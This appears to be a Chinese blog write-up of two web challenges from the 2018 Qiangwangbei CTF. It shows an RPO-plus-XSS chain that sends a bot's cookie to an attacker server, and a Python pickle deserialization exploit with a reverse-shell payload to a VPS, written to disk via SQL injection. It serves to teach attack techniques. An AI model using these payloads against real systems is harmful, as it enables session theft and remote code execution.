---
title: 第二届强网杯Web部分 Writeup
date: 2018-03-27 18:06:02
tags: [CTF, writeup, Web, RPO]
categories: Security
---
强网杯Web部分的题难度不小，还是比较有意思的，收获很大，这里简单分析一下其中两道题

### Share your mind
```
http://39.107.33.96:20000
Please help me find the vulnerability before I finish this site！
hint：xss bot使用phantomjs，版本2.1.1
hint2 : xss的点不在report页面
```
根据writeup描述，这是一道RPO攻击的题目，以前没接触过，趁机学习一波

首先注册用户登录，查看源码，最后几行，可以看到引用js的时候这里使用了相对路径，构成RPO攻击的条件，简单尝试几个url发现确实可以利用。

RPO攻击的原理可以参考

https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html

http://blog.nsfocus.net/rpo-attack/

访问`http://39.107.33.96:20000/index.php/view/article/1226`的时候加载`jquery.min.js`的路径可以看到是正常的，

![jquery.js](https://ob5vt1k7f.qnssl.com/oHZtz)
当访问`http://39.107.33.96:20000/index.php/view/article/1226/..%2f..%2f..%2f..%2findex.php`的时候浏览器尝试加载`..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js`这个数据，而服务端则往上读取三层路径，加载的是article的页面，如果article页面存在xss的话就会被加载，题目也正好满足要求，所以我们创建一篇文章写入获取cookie的js,利用这个url让服务器请求这篇文章，弹给我们cookie

![jquery.js](https://ob5vt1k7f.qnssl.com/pa5qf)

因为页面对一些特殊符号做了编码过滤，所以我们使用`String.fromCharCode()`方法从ascii码来加载js
```
window.location.href=String.fromCharCode(some ascii code) + document.cookie;
```

![md5](https://ob5vt1k7f.qnssl.com/SVQMd)
这里有两个点的绕过：

- url部分做了同站检测，通过`http://39.107.33.96:20000@x.x.x.x`的形式绕过
- 这里的code每次刷新都是随机的，而且通过`===`比较，没法通过弱类型绕过，所以我们生成所有6位字符的MD5，搜索前6位符合条件的就行(实际上生成了大约200M的文件基本够用了)

根据提示要访问`/QWB_fl4g/QWB/`页面，所以我们在vps上建一个带iframe的页面
```
<img src='http://39.107.33.96:20000/QWB_fl4g/QWB/index.php'>  
<iframe src='http://39.107.33.96:20000/QWB_fl4g/QWB/index.php/..%2f..%2f../index.php/view/article/1462/..%2f..%2f..%2f..%2findex.php'></iframe>
```
nc监听端口，xssbot会先访问`/QWB_fl4g/QWB/index.php`，带上cookie后再访问article，触发xss，我们就能收到cookie

![flag](https://ob5vt1k7f.qnssl.com/yDw2L)


### python is the best language #2

考点：session处存在反序列化漏洞

`app/others.py` `FilterException`类`load`方法存在反序列化漏洞
```python
class FilterException(Exception):

    def __init__(self, value):
        super(FilterException, self).__init__(
            'the callable object {value} is not allowed'.format(value=str(value)))


def _hook_call(func):
    def wrapper(*args, **kwargs):
        print args[0].stack
        if args[0].stack[-2] in black_type_list:
            raise FilterException(args[0].stack[-2])
        return func(*args, **kwargs)
    return wrapper


def load(file):
    unpkler = Unpkler(file)
    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])
    return Unpkler(file).load()
```


先测试一下序列化与反序列化过程可能产生的安全问题

- 序列化

```python
import os
from pickle import Pickler

class test(object):
    def __reduce__(self):
        return (os.system, ('whoami'))
evil = test()

def dump(file):
    pk = Pickler(file)
    pk.dump(evil)

with open('test', 'wb') as f:
    dump(f)
```
会将python对象序列化成字符串写入文件，类似这个样子
```
cnt
system
p0
(S'whoami'
p1
tp2
Rp3
.
```

- 反序列化

```python
from pickle import Unpickler

def load(file):
    return Unpickler(file).load()

with open('test', 'rb') as f:
    load(f)
```
从文件读取进行反序列化，如果含有可执行的命令就会执行

题目中对一些系统命令加入了黑名单，没法直接使用，但是这里可以用`subprocess`、`commands`等，同样是执行系统命令

`load()`方法并没有对传入的`file`进行任何过滤，就会导致反序列化漏洞

全局搜索一下调用`load()`方法的部分

`app/Mycache.py` 
`get()`方法
```python
def get(self, key):
    filename = self._get_filename(key)
    try:
        with open(filename, 'rb') as f:
            pickle_time = load(f)
            if pickle_time == 0 or pickle_time >= time():
                a = load(f)
                return a
            else:
                os.remove(filename)
                return None
    except (IOError, OSError, PickleError):
        return None
```
传入filename进行了load，跟进`_get_filename()`方法
```python
def _get_filename(self, key):
    if isinstance(key, text_type):
        key = key.encode('utf-8')  # XXX unicode review
    hash = md5(key).hexdigest()
    return os.path.join(self._path, hash)
```
可以看到对key进行了MD5加密

再搜索调用`get()`方法的地方

![get()](https://ob5vt1k7f.qnssl.com/S2Qaa)
```python
def open_session(self, app, request):
    sid = request.cookies.get(app.session_cookie_name)
    if not sid:
        sid = self._generate_sid()
        return self.session_class(sid=sid, permanent=self.permanent)
    if self.use_signer:
        signer = self._get_signer(app)
        if signer is None:
            return None
        try:
            sid_as_bytes = signer.unsign(sid)
            sid = sid_as_bytes.decode()
        except BadSignature:
            sid = self._generate_sid()
            return self.session_class(sid=sid, permanent=self.permanent)
    data = self.cache.get(self.key_prefix + sid)
    if data is not None:
        return self.session_class(data, sid=sid)
    return self.session_class(sid=sid, permanent=self.permanent)
```
发现在`app/Mysessions.py`处理session部分的方法调用了`get`，传进去的参数是`self.key_prefix + sid`，即`前缀+session`值，类似这个样子
`bdwsessions855f1297-d81e-4366-aaaa-80c9edb87338`

配置文件里看到`SESSION_FILE_DIR = "/tmp/ffff"`

所以整个流程大致是这样:

用户注册或登录，取得cookie中的session值，加上前缀后再对文件名进行MD5加密，存储在`/tmp/ffff`目录下

在验证用户的过程中，对`/tmp/ffff`目录相应文件名文件进行反序列化，假如我们对文件名和文件内容可控，那么就可以造成漏洞

结合上一个sql注入漏洞，我们可以`select evilcode into outfile '/tmp/ffff/md5';`

在访问页面的时候修改session值为md5对应的明文，就可以让程序反序列化含有恶意代码的md5文件

修改上面序列化代码:
```python
import cPickle
import os
import subprocess
class Exploit(object):
    def __reduce__(self):
        return (subprocess.Popen, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"vpsip\",82));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))
shellcode = cPickle.dumps(Exploit())
print '0x' + shellcode .encode('hex')
```
假设我们要设置session为testabcd，对应的`bdwsessionstestabcd`md5值为`209a05e8b11c8e74ab03c110e6e5d591`

构造sql语句
```sql
select id from user where email = 'test'/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/'/tmp/ffff/209a05e8b11c8e74ab03c110e6e5d591'#@test.com'
```
这样就把十六进制的恶意代码写入了`/tmp/ffff/`下

然后访问index，修改cookie的session值为`testabcd`，触发反序列化漏洞后反弹shell

![reverse_shell](https://ob5vt1k7f.qnssl.com/mYzKP)


总结：
- RPO可以结合XSS进行攻击，开发时不注意的话容易被利用
- 反序列化问题一直都存在，这道题中虽然代码比较简单，利用起来还是有几个坑，还需要多学习